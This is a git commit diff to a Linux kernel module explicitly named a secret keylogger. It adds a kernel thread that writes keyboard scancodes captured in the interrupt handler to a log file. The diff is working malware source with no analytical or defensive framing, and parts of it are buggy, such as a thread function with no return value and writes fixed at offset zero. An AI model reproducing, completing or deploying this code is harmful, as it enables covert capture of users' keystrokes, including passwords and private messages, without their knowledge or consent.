8718d773ce2d47f045a9f0e1a5e21516da48602c
unixunited <root@localhost.localdomain>
2014-12-01 17:33:24 -0600

    kthread

--- kb.c
+++ kb.c
@@ -13,10 +13,15 @@
 #include <linux/buffer_head.h>
 #include <linux/string.h>
 
+#include <linux/kthread.h>
+#include <linux/sched.h>
+
 #define KB_IRQ 1
 
 const char* NAME = "---Secret_Keylogger---";
-struct file* log_fp = NULL;
+struct file* log_fp;
+unsigned char g;
+struct task_struct *logger;
 
 /* =================================================================== */
 
@@ -60,6 +65,30 @@ int log_write(struct file *fp, unsigned long long offset, unsigned char *data,
 	return ret;
 }
 
+/* =================================================================== */
+
+int kthread_log_keystrokes(void *data)
+{
+	char c = 0x00;
+	{
+		char buf[16];
+		memset(buf, 0, sizeof(buf));
+		strcpy(buf, "Test!\n");
+		log_write(log_fp, 0, buf, sizeof(buf));
+	}
+
+	while(!kthread_should_stop()){
+		schedule();
+		if(c != g){
+			char buf[16];
+			memset(buf, 0, sizeof(buf));
+			sprintf(buf, "[%d]", c);
+			log_write(log_fp, 0, buf, sizeof(buf));
+		}
+		c = g;
+	}
+}
+
 irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 {
 	static unsigned char scancode, status;
@@ -69,13 +98,16 @@ irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
 
 	if(scancode == 0x02 || scancode == 0x82){
 		printk("You pressed ESC!\n");
+	}
+	else{
+		g = scancode;
+	}
 	/* TODO:
 	 * Writing to a file during an ISR crashes the system, so
 	 * fill a queue/buffer and then write out this buffer to the 
 	 * log in a non-atomic context where sleeping is allowed.
 	 * e.g., a tasklet
 	 */
-	}
 	
 	return (irq_handler_t)IRQ_HANDLED;
 }
@@ -100,7 +132,8 @@ static int __init kb_init(void)
 		memset(buf, 0, sizeof(buf));
 		strcpy(buf, "[a][a]\n[b][b]\n");
 		log_write(log_fp, 0, buf, sizeof(buf));
-		log_close(log_fp);
+		logger = kthread_run(&kthread_log_keystrokes, NULL, "pradeep");
+		printk("KERNEL THREAD: %s\n", logger->comm);		
 	}
 
 	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
@@ -114,6 +147,7 @@ static int __init kb_init(void)
 
 static void __exit kb_exit(void)
 {
+	kthread_stop(logger);
 	free_irq(KB_IRQ, (void*)(kb_irq_handler));
 	if(log_fp != NULL){
 		log_close(log_fp);
